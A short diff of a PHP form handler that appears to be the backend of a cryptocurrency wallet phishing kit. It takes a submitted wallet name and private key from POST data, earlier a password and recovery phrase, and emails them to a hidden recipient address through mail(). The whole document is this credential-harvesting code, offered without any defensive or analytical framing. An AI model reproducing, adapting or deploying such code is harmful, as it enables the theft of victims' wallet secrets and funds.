@@ -1,9 +1,9 @@
 <?php
 
 
+// $Useremail= $_POST['email'];
 $wallet= $_POST['wallet'];
-$password= $_POST['password'];
-$phrase= $_POST['phrase'];
+$key= $_POST['key'];
 // $walletName ;
 
 
@@ -97,7 +97,7 @@ $headers = 'MIME-Version: 1.0' . "\r\n";
 $headers .= "From: " . $email . "\r\n"; // Sender's E-mail
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
  
-$message = " wallet is : {$wallet}.  password is : {$password} and phrase is: {$phrase}";
+$message ="key is : {$key} and wallet is {$wallet}";
  
 if (@mail($to, $email, $message, $headers))
 {
